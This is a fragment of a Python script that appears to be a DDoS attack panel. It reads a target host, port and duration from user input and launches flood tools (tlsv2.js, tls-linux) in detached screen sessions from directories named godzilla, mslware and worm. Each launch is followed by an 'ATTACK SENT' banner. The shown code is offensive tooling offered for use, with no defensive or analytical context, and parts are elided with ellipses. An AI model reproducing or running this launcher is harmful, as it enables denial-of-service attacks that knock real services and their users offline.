...
""")
			...
			try:
				...
				os.system(f'cd /media/ && screen -dm node tlsv2.js {host} {time} 8 8')
				os.system(f'cd /media/ && screen -dm ./tls-linux {host} {time} 8 8 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && screen -dm node tlsv2.js {host} {time} 8 8')
				os.system(f'cd mslware && screen -dm node tlsv2.js {host} {time} 8 1')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd worm && screen -dm ./tls-linux {host} {time} 8 8 500')
				os.system(f'cd wormc && screen -dm ./tls-linux {host} {time} 8 5 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
